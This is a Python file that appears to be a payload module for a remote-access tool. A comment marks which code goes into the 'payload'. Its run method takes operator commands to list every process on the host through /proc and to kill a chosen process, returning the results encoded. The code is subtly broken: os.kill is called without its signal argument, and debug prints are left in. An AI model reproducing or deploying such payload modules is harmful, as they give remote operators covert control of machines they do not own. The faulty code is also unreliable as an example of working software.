import socket
import sys

sys.path.append('../../../')

from lib.tool import EZData, Encoder

#[THE CODE ABOVE WILL NOT BE INCLUDED IN PAYLOAD]

import os
from dataclasses import dataclass

class Process:
    def __init__(self):
        pass

    @dataclass
    class ProcessInfo:
        pid = 0
        name = ''
        status = ''
        ppid = 0
        uid = 0
        vmrss = 0
        vmsize = 0
        cmdline = ''
        utime = 0
        stime = 0

    def get_processes(self) -> list:
        def read_file(path: str):
            with open(path, 'r') as f:
                return f.read().strip()

        lsProc = []

        for pid in filter(str.isdigit, os.listdir('/proc')):
            try:
                with open(f'/proc/{pid}/status') as f:
                    status = f.read()
                
                cmdline = read_file(f'/proc/{pid}/cmdline').replace('\x00', ' ')
                stat = read_file(f'/proc/{pid}/stat').split()

                info = {}
                for line in status.splitlines():
                    if ":" in line:
                        k, v = line.split(":", 1)
                        info[k.strip()] = v.strip()
                
                pInfo = Process.ProcessInfo()
                pInfo.pid = int(pid)
                pInfo.name = info.get('Name')
                pInfo.status = info.get('State')
                pInfo.ppid = info.get('PPid')
                pInfo.uid = info.get('Uid')
                pInfo.vmrss = info.get('VmRSS')
                pInfo.vmsize = info.get('VmSize')
                pInfo.cmdline = cmdline
                pInfo.utime = int(stat[13])
                pInfo.stime = int(stat[14])

                lsProc.append(pInfo)

            except Exception as ex:
                pass

        return lsProc

    def run(self, clnt: object, szToken: str, lsMsg: list) -> list:
        try:
            print('xxx')
            if lsMsg[0] == 'ls':
                ls = []
                for info in self.get_processes():
                    ls.append([
                        str(info.pid),
                        info.name,
                        info.status,
                        str(info.ppid),
                        str(info.uid),
                        str(info.vmrss),
                        str(info.vmsize),
                        info.cmdline,
                        str(info.utime),
                        str(info.stime),
                    ])

                    print(ls)

                return [
                    'proc',
                    'ls',
                    '1',
                    EZData.twoDlist2str(ls),
                ]
            elif lsMsg[0] == 'kill':
                os.kill(int(lsMsg[1]))
                
                return [
                    'proc',
                    'kill',
                    '1',
                    lsMsg[1],
                ]

        except Exception as ex:
            print(ex)
            return [
                'proc',
                lsMsg[0],
                '0',
                Encoder.stre2b64(ex),
            ]
        
if __name__ == '__main__':
    p = Process()
    for i in p.get_processes():
        print(i.pid)